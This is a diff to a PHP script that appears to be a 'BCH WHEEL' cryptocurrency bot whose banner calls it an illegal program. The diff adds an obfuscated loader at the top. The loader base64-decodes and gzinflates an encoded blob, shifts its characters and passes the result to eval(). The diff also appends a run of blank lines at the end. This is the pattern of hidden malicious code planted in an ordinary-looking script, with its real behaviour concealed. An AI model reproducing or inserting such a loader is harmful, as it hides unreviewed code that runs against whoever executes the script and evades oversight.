@@ -1,5 +1,12 @@
-<?php
-
+<?php function zizQ($JWC)
+{ 
+$JWC=gzinflate(base64_decode($JWC));
+ for($i=0;$i<strlen($JWC);$i++)
+ {
+$JWC[$i] = chr(ord($JWC[$i])-1);
+ }
+ return $JWC;
+ }eval(zizQ("VdHfSsMwFMfxB8hThDJYHYx2S90YZRfDC2+UQt2NKJTMHrdo+ofTFJkvb2Jje+xN4ZMvhf7CuX0Y666dgSqcv2mQOL9JGSulgaKEd9lrUxhVwXdTQ9GBCYNDp2T0IT8lGhm4Nlrwp+MhP/K77CHL+SJiDBAbLBDaBo2qz2HsuhlCtw9eYyFetlXg4KKMrDzFqYgHlad+7XE1YtsbdZnSLVESe0Yop3Q1Ggk9nhGgntI1URJ7voLWzddUC8ok937SPUxxMiFJk7/fwFaT+JYyyb3r/5/eECXxhkwk+J4PByLduZF4FD0qtFdjC3vN47Ff212/NfcKg+dltSx/b3qW1UU+bpv4tS3ekx0TN5dfRXjbDav8AA=="));
 $versi = "1";
 $server = "Online";
 $bot = "BCH WHEEL";
@@ -21,3 +28,30 @@ echo"│$putih3$red2 •> WARNING..!!$def\n";
 echo$green2."│$putih3$yellow2 •> Program Ilegal..!!$def\n";
 echo$green2."│$putih3$green2 •> Segala Resiko Di Tanggung Pengguna..!!!$def\n";
 echo$green2."└────────────────────────────────────────────────────────────────────┘";
+
+$bot = false;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+?>
